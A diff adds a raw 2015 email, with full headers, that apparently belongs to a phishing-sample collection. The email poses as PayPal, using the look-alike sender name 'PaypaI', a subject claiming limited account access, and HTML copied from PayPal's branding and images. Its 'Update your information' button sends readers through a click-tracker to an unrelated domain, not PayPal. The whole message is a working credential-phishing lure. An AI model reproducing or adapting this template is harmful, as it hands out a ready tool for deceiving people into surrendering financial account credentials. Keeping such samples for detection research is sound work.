@@ -1,0 +1,287 @@
+Return-Path: <xwwxyh@technologieinfo.com>
+X-Original-To: jose@login.monkey.org
+Delivered-To: jose@login.monkey.org
+Received: from forward.b.hostedemail.com (forward.b.hostedemail.com [64.98.36.17])
+	by l.monkey.org (Postfix) with ESMTP id 78706F4127
+	for <jose@login.monkey.org>; Mon, 18 May 2015 18:01:48 -0500 (CDT)
+Received: from smtpin04.hostedemail.com (10.5.19.248.rfc1918.com [10.5.19.248])
+	by ofarelay03.b.hostedemail.com (Postfix) with SMTP id 4E770184665
+	for <jose@login.monkey.org>; Mon, 18 May 2015 23:01:47 +0000 (UTC)
+X-Forwarded-For: jose@monkey.org by Hostedemail
+Delivered-To: jose@monkey.org
+X-FDA: 70201546254.04.key43_f730e783e95b
+Authentication-Results: auth.b.hostedemail.com; dkim=none
+	reason="no signature"; dkim-adsp=none (insecure policy);
+	dkim-atps=neutral
+X-Spam-Summary: 75,0,0,188c892c40d903b3,d41d8cd98f00b204,xwwxyh@technologieinfo.com,,RULES_HIT:4:41:72:152:355:375:379:387:455:539:540:541:542:543:567:960:962:967:973:978:983:988:989:1021:1155:1189:1208:1224:1260:1311:1313:1314:1345:1394:1395:1430:1431:1432:1433:1434:1437:1515:1516:1517:1555:1561:1571:1587:1588:1589:1593:1594:1685:1714:1730:1747:1777:1792:1801:1803:2073:2076:2198:2199:2393:2525:2527:2528:2553:2559:2568:2570:2682:2685:2703:2859:2890:2892:2895:2926:2933:2937:2939:2942:2945:2947:2951:2954:3022:3866:3867:3868:3873:3934:3936:3938:3941:3944:3947:3950:3953:3956:3959:4042:4321:4605:5007:6096:6117:6261:6650:8515:8518:8550:8599:8603:8957:9025:9080:9121:9149:9388:9392:9908:10004:10049:10128:10305:10346:11658:12956:12958,0,RBL:209.85.215.102-irl.urbl.hostedemail.com-127.0.0.175,CacheIP:none,Bayesian:0.5,0.5,0.5,Netcheck:none,DomainCache:0,MSF:not bulk,SPF:fn,MSBL:0,DNSBL:neutral,Custom_rules:0:0:0
+X-HE-Tag: key43_f730e783e95b
+X-Filterd-Recvd-Size: 19082
+Received: from mail-la0-f102.google.com (mail-la0-f102.google.com [209.85.215.102])
+	by imf25.b.hostedemail.com (Postfix) with ESMTP
+	for <jose@monkey.org>; Mon, 18 May 2015 23:01:46 +0000 (UTC)
+Received: by labgd6 with SMTP id gd6so15072678lab.3
+        for <jose@monkey.org>; Mon, 18 May 2015 16:01:45 -0700 (PDT)
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20130820;
+        h=x-gm-message-state:message-id:reply-to:from:subject:date
+         :mime-version:content-type:content-transfer-encoding;
+        bh=SSdM/3HgrThxSFSgFfF8Me/URu7Ou1Jd5jIm1/j3k6w=;
+        b=N4qauMegdyJQgSaWne+vHpfqjA0YpL/IoWEUmYwBd/6D14egEFtOLxbDgJb7/wXNj3
+         9DVGnfltchPBjxcJmzXItsWJ6J5/cGLykNRCEZLnNXRsXqKoNkpUfkEjNjT1iZZg/eQ8
+         MDHVn8fNKoiWnnyRGRJumUZEssXSoZChLeVXSIs3a7wHI5jXA7QLL5dFjcm9jOkgg/AQ
+         bd6ZBMkxpcPUWpwbuZpeaJUxUn1thPYMi97WguJelEuzuxmwNN/+w0QHEwRkaCSsS/vj
+         XIxZGJspEF1mruM3bZX4vUc2LAlnGLN8nlMAOTDu9igKQbTupEZTv1DT54QFxYK7gXvB
+         +F7g==
+X-Gm-Message-State: ALoCoQm4e7ti9cPWjOhn4FqAy2SZXDvHwo0dELc79HDQ9xqDjto/vqdI1KW7/s7BrJw1KQsPHMQAgSpwEFmeWZqcGIv6v6UTvQ==
+X-Received: by 10.180.91.76 with SMTP id cc12mr26631682wib.67.1431990105035;
+        Mon, 18 May 2015 16:01:45 -0700 (PDT)
+Received: from noreply@technologieinfo.com ([41.225.229.156])
+        by mx.google.com with SMTP id op1sm724708wjc.3.2015.05.18.16.01.41;
+        Mon, 18 May 2015 16:01:45 -0700 (PDT)
+X-Relaying-Domain: technologieinfo.com
+Message-Id: <555a6f59.61d8c20a.1b2e.ffff87afSMTPIN_ADDED_MISSING@mx.google.com>
+Reply-To: xwwxyh@technologieinfo.com
+From: PaypaI<xwwxyh@technologieinfo.com>
+Subject: We've Iimited access to your PayPal account
+Date: Tue, 19 May 2015 00:01:49 +0200
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="utf-8"
+Content-Transfer-Encoding: 7bit
+X-Priority: 1
+X-MSMail-Priority: High
+X-Mailer: Microsoft Outlook Express 6.00.2600.0000
+X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2600.0000
+Status: RO
+X-Status: 
+X-Keywords:                 
+X-UID: 91
+
+<html xmlns="http://www.w3.org/1999/xhtml"><head>
+<title>wassxc</title>
+<style type="text/css">
+/*<![CDATA[*/
+a {
+	text-decoration: none;
+}
+.appleLinks a {
+	color: #8c8c8c !important;
+	text-decoration: none;
+}
+.appleLinks1 a {
+	color: #009cde !important;
+	text-decoration: none !important;
+}
+.appleLinks2 a {
+	color: #5e5e5e !important;
+	text-decoration: none !important;
+}
+.appleLinks3 a {
+	color: #666666 !important;
+	text-decoration: none !important;
+}
+*[class=br] {
+	display: block !important;
+}
+    /*]]>*/
+</style>
+</head>
+<body leftmargin="0" bgcolor="#F2F2F2">
+<table border="0" cellpadding="0" cellspacing="0" width="100%">
+  <tbody>
+    <tr>
+      <td valign="top"><table bgcolor="#F2F2F2" border="0" width="100%" cellpadding="0" cellspacing="0">
+          <tbody>
+            <tr>
+              <td><table cellpadding="0" cellspacing="0" align="center" border="0" width="700">
+                  <tbody>
+                    <tr>
+                      <td><table cellpadding="0" cellspacing="0" border="0" width="700">
+                          <tbody>
+                            <tr>
+                              <td style="font-size:0; line-height:0;" height="21" valign="top"><img src="https://image.paypal-communication.com/paypal_na/2014/20140924_NM_Rebrand_Batch1_Trigger_36109/images/img_spacer.gif" alt="" style="display:block;" border="0" height="21" width="1"></td>
+                            </tr>
+                          </tbody>
+                        </table></td>
+                    </tr>
+                    <tr>
+                      <td><table cellpadding="0" cellspacing="0" bgcolor="#FFFFFF" border="0" width="700">
+                          <tbody>
+                            <tr>
+                              <td style="font-size:0; line-height:0;" bgcolor="#E3E3E3" valign="top" width="1"><img src="https://image.paypal-communication.com/paypal_na/2014/20140924_NM_Rebrand_Batch1_Trigger_36109/images/img_spacer.gif" alt="" style="display:block;" border="0" height="1" width="1"></td>
+                              <td valign="top"><br> <b><font size="61"><font color="#00457c" style="font-family:Verdana;padding-left:25px;">Pay</font><font color="#009cde" style="font-family:Verdana;">Pal</font></font><font size="1"></font></b>
+                                <table cellpadding="0" cellspacing="0" border="0" width="698">
+                                  <tbody>
+                                    <tr>
+                                      <td></td>
+                                    </tr>
+                                    <tr>
+                                      <td></td>
+                                    </tr>
+                                    <tr>
+                                      <td style="font-size:0; line-height:0; min-width:698px;"><strong><img src="https://image.paypal-communication.com/paypal_na/2014/20140924_NM_Rebrand_Batch1_Trigger_36109/images/img_spacer.gif" alt="" style="display:block;" border="0" height="1" width="698"></strong></td>
+                                    </tr>
+                                  </tbody>
+                                </table>
+                                <table cellpadding="0" cellspacing="0" border="0" width="698">
+                                  <tbody>
+                                    <tr>
+                                      <td style="font-size:0; line-height:0;" valign="top" width="28">&nbsp;</td>
+                                      <td><table cellpadding="0" cellspacing="0" border="0" width="670">
+                                          <tbody>
+                                            <tr>
+                                              <td style="font-size:0; line-height:0;"><img src="https://image.paypal-communication.com/paypal_na/2014/20140924_NM_Rebrand_Batch1_Trigger_36109/images/img_spacer.gif" alt="" style="display:block;" border="0" height="17" width="1"></td>
+                                            </tr>
+                                            <tr>
+                                              <td><br>
+                                                <table width="580" border="0" cellspacing="0" cellpadding="0">
+                                                  <tbody>
+                                                    <tr>
+                                                      <td><table width="540" border="0" cellspacing="0" cellpadding="0">
+                                                          <tbody>
+                                                            <tr>
+                                                              <td style="font-family:'Helvetica Neue Light', Helvetica, Arial, sans-serif; font-size:38px;color:#009cde;line-height:48px" valign="top"> We need your help</td>
+                                                            </tr>
+                                                          </tbody>
+                                                        </table></td>
+                                                    </tr>
+                                                    <tr>
+                                                      <td style="font-size:0; line-height:0;"><img src="https://image.paypal-communication.com/paypal_na/2014/20140924_NM_Rebrand_Batch1_Trigger_36109/images/img_spacer.gif" alt="" style="display:block;" border="0" height="20" width="1"></td>
+                                                    </tr>
+                                                    <tr>
+                                                      <td style="font-family:'Helvetica Neue Light', Helvetica, Arial, sans-serif; font-size:16px; color:#5e5e5e;line-height:22px"><strong> Your Account Was used via a web browser </strong> <br><br>
+                                                      Date and Time : 17 May 2015, 11:51PM<br>Browser : Chrome<br>
+ Operation System : Mac<br>
+                                                        <strong> We need
+                                                        you to
+                                                        update
+                                                        your
+                                                        informations
+                                                        for
+                                                        further
+                                                        use of
+                                                        your
+                                                        PayPal
+                                                        account.<br>
+                                                        </strong><br>
+                                                        
+                                                                <table width="299" border="0" cellspacing="0" cellpadding="0">
+                                                                    <tbody>
+                                                                      <tr>
+                                                                        <td height="40" width="1"><img src="https://image.paypal-communication.com/paypal_eu/common/module_system/modules/spacer10.gif" height="40" width="1" border="0" style="display:block" class="CToWUd"></td>
+                                                                        <td align="center" valign="middle" style="font-family:Arial,sans-serif;font-weight:bold;font-stretch:normal;text-align:center;color:#ffffff;font-size:13px;background:#009cde;border-radius:7px!important"><a href="http://mandrillapp.com/track/click/30623358/www.betterliving-concepts.com?p=eyJzIjoiVkRleUgtUmFoa3Z0RUlDcHp2cW5FZFo2R2JvIiwidiI6MSwicCI6IntcInVcIjozMDYyMzM1OCxcInZcIjoxLFwidXJsXCI6XCJodHRwOlxcXC9cXFwvd3d3LmJldHRlcmxpdmluZy1jb25jZXB0cy5jb21cXFwvbGliXFxcL2pzXCIsXCJpZFwiOlwiNmFhMjM3MTIzNzVmNDk2MjgxNjc2ZTBiZGUwMzEwMGNcIixcInVybF9pZHNcIjpbXCJkOGQ1MmYzY2JmYzcyNGIzZWM0ODE4N2VlOTc4NTAwODQ3ZTYyZGNkXCJdfSJ9" style="color:#ffffff;text-decoration:none;display:block;font-weight:bold" target="[random_string]"><span style="color: #ffffff;text-decoration: none;display: block;font-family: Arial, sans-serif;font-weight: bold;font-size: 13px;line-height: 15px"> Update your information</span></a></td>
+                                                                      </tr>
+                                                                    </tbody>
+                                                                  </table>
+                                                              
+                                                        
+                                                        <br>
+                                                        <br>
+                                                        <strong>Sincerely, </strong><br><br>
+PayPal Support</td>
+                                                    </tr>
+                                                    <tr>
+                                                      <td style="font-size:0; line-height:0;"><img src="https://image.paypal-communication.com/paypal_na/2014/20140924_NM_Rebrand_Batch1_Trigger_36109/images/img_spacer.gif" alt="" style="display:block;" border="0" height="15" width="1"></td>
+                                                    </tr>
+                                                    <tr>
+                                                      <td align="center"><table width="670" border="0" cellspacing="0" cellpadding="0" align="center">
+                                                          <tbody>
+                                                            <tr>
+                                                              <td width="83" valign="middle" align="left"></td>
+                                                              <td><table width="225" cellspacing="0" cellpadding="0" border="0" align="left">
+                                                                  <tbody>
+                                                                    
+                                                                    <tr>
+                                                                      <td width="10" align="left" valign="top" style="font-family:'Helvetica Neue Light', Helvetica, Arial, sans-serif; font-size: 20px;color:#5e5e5e;line-height:24px;"></td>
+                                                                      
+                                                                    </tr>
+                                                                  </tbody>
+                                                                </table></td>
+                                                              
+                                                            </tr>
+                                                          </tbody>
+                                                        </table></td>
+                                                    </tr>
+                                                    <tr>
+                                                      <td style="font-size:0; line-height:0;"><img src="https://image.paypal-communication.com/paypal_na/2014/20140924_NM_Rebrand_Batch1_Trigger_36109/images/img_spacer.gif" alt="" style="display:block;" border="0" height="20" width="1"></td>
+                                                    </tr>
+                                                  </tbody>
+                                                </table></td>
+                                            </tr>
+                                          </tbody>
+                                        </table></td>
+                                    </tr>
+                                  </tbody>
+                                </table></td>
+                              <td style="font-size:0; line-height:0;" bgcolor="#E3E3E3" valign="top" width="1"><img src="https://image.paypal-communication.com/paypal_na/2014/20140924_NM_Rebrand_Batch1_Trigger_36109/images/img_spacer.gif" alt="" style="display:block;" border="0" height="1" width="1"></td>
+                            </tr>
+                          </tbody>
+                        </table></td>
+                    </tr>
+                    <tr>
+                      <td valign="top">&nbsp;</td>
+                    </tr>
+                    <tr>
+                      <td><table cellpadding="0" cellspacing="0" bgcolor="#F2F2F2" border="0" width="700">
+                          <tbody>
+                            <tr>
+                              <td style="font-size:0; line-height:0;"><img style="display:block;" alt="" src="https://image.paypal-communication.com/paypal_na/2014/20140924_NM_Rebrand_Batch1_Trigger_36109/images/img_spacer.gif" border="0" height="15" width="1"></td>
+                            </tr>
+                            <tr>
+                              <td></td>
+                            </tr>
+                            <tr>
+                              <td style="font-size:0; line-height:0;"><img style="display:block;" alt="" src="https://image.paypal-communication.com/paypal_na/2014/20140924_NM_Rebrand_Batch1_Trigger_36109/images/img_spacer.gif" border="0" height="15" width="1"></td>
+                            </tr>
+                            <tr>
+                              <td style="font-size:0; line-height:0;" align="left" bgcolor="#D9D9D9" height="1" valign="top"><img src="https://image.paypal-communication.com/paypal_na/2014/20140924_NM_Rebrand_Batch1_Trigger_36109/images/img_spacer.gif" alt="" style="display:block;" border="0" height="1" width="1"></td>
+                            </tr>
+                            <tr>
+                              <td style="font-size:0; line-height:0;" align="left" bgcolor="#FFFFFF" height="1" valign="top"><img src="https://image.paypal-communication.com/paypal_na/2014/20140924_NM_Rebrand_Batch1_Trigger_36109/images/img_spacer.gif" alt="" style="display:block;" border="0" height="1" width="1"></td>
+                            </tr>
+                            <tr>
+                              <td align="center"><table cellpadding="0" cellspacing="0" align="center" border="0" width="640">
+                                  <tbody>
+                                    <tr>
+                                      <td style="font-size:0; line-height:0;"><img style="display:block;" alt="" src="https://image.paypal-communication.com/paypal_na/2014/20140924_NM_Rebrand_Batch1_Trigger_36109/images/img_spacer.gif" border="0" height="15" width="1"></td>
+                                    </tr>
+                                    <tr>
+                                      <td align="left" style="font-family:'Helvetica Neue Light', Helvetica, sans-serif; font-size: 11px;color:#8c8c8c;line-height:17px"><table border="0" cellspacing="0" cellpadding="0">
+                                          <tbody>
+                                            <tr>
+                                              <td></td>
+                                            </tr>
+                                          </tbody>
+                                        </table>
+                                        <table width="100%" border="0" cellspacing="0" cellpadding="0">
+                                          <tbody>
+                                            <tr>
+                                              <td colspan="3"><img style="display: block" src="https://image.paypal-communication.com/paypal_na/common/spacer.gif" alt="" width="1" height="10" border="0"></td>
+                                            </tr>
+                                            <tr>
+                                              
+                                            </tr>
+                                            <tr>
+                                              <td colspan="3"><img style="display: block" src="https://image.paypal-communication.com/paypal_na/common/spacer.gif" alt="" width="1" height="10" border="0"></td>
+                                            </tr>
+                                          </tbody>
+                                        </table></td>
+                                    </tr>
+                                  </tbody>
+                                </table></td>
+                            </tr>
+                          </tbody>
+                        </table></td>
+                    </tr>
+                  </tbody>
+                </table></td>
+            </tr>
+          </tbody>
+        </table></td>
+    </tr>
+  </tbody>
+</table>
+<p> <img height="1" width="1" src="https://email-edg.paypal.com/o/UL10GEN/LQTGPB/IQI2S3F/Y87G52/DX7O/52"><!-- [[UL10GEN-3OFB1M-LQTGPB-IQI2S3F-Y87G52-H-M2-20141231-3ef5717e9daf2]] --> 
+</p>
+
+</body></html>
